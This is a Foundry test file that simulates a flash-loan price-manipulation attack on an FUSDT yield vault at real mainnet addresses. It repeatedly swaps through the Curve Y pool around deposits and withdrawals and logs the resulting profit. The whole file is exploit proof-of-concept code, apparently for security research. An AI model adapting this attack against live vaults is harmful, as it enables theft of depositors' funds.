// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;
import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}

interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address) external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
}

contract TestSmallFUSDT is Test {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant CURVE = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address constant FUSDT = 0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C;

    function testSmallDrain() public {
        // Simulate flash: give USDT (outer) and USDC (inner)
        deal(USDT, address(this), 5_000_000e6);
        deal(USDC, address(this), 5_000_000e6);
        
        // Safe approve for USDT
        (bool s,) = USDT.call(abi.encodeWithSignature("approve(address,uint256)", CURVE, type(uint256).max));
        require(s);
        (s,) = USDT.call(abi.encodeWithSignature("approve(address,uint256)", FUSDT, type(uint256).max));
        require(s);
        IERC20(USDC).approve(CURVE, type(uint256).max);

        uint256 usdtBefore = IERC20(USDT).balanceOf(address(this));
        uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));

        for (uint i = 0; i < 7; i++) {
            uint256 usdtPre = IERC20(USDT).balanceOf(address(this));
            
            // PUMP: USDC → USDT
            ICurveYPool(CURVE).exchange_underlying(1, 2, 5_000_000e6, 0);
            uint256 pumpedUSDT = IERC20(USDT).balanceOf(address(this)) - usdtPre;
            
            // DEPOSIT pumped USDT
            IHVault(FUSDT).deposit(pumpedUSDT);
            
            // DUMP: USDT → USDC (using outer buffer)
            ICurveYPool(CURVE).exchange_underlying(2, 1, 5_000_000e6, 0);
            
            // WITHDRAW
            uint256 shares = IHVault(FUSDT).balanceOf(address(this));
            IHVault(FUSDT).withdraw(shares);
        }

        uint256 usdtAfter = IERC20(USDT).balanceOf(address(this));
        uint256 usdcAfter = IERC20(USDC).balanceOf(address(this));
        emit log_named_int("USDT profit", int256(usdtAfter) - int256(usdtBefore));
        emit log_named_int("USDC change", int256(usdcAfter) - int256(usdcBefore));
    }
}
